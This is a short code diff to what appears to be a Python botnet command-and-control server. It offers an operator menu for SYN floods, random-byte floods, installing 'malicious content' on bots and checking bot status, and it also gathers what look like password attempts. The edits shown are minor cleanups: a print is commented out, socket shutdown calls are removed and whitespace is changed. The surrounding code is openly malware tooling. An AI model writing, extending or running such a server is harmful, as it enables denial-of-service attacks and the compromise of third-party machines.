@@ -35,7 +35,7 @@ def sendcommands():
 	global exitfunction
 	global s
 	while True:
-		print("Choose the type of command to execute ")
+		print("Choose the type of command to execute")
 		print("1) SYN Flood\n 2) Install malicious content \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
 		input_get = raw_input()
 		
@@ -64,7 +64,7 @@ def sendcommands():
 					passattempts.append(templist)
 					templist = []
 
-			print(passattempts)
+			#print(passattempts)
 
 		if int(input_get) == 5:
 			exitfunction = True
@@ -95,8 +95,6 @@ def sendcommands():
 		i = 0
 
 		if exitfunction == True:
-			s.shutdown(socket.SHUT_WR)
-
 			return
 
 
@@ -111,6 +109,7 @@ addresstracker = list()
 
 commandsender = threading.Thread(target=sendcommands)
 commandsender.start()
+
 
 while True:
 	clientsocket,address = s.accept()
@@ -127,8 +126,6 @@ while True:
 
 
 commandsender.join()
-#s.shutdown(socket.SHUT_WR)
-#socket.shutdown(socket.SHUT_WR)
 
 for index in listofbots:
 	index.join()
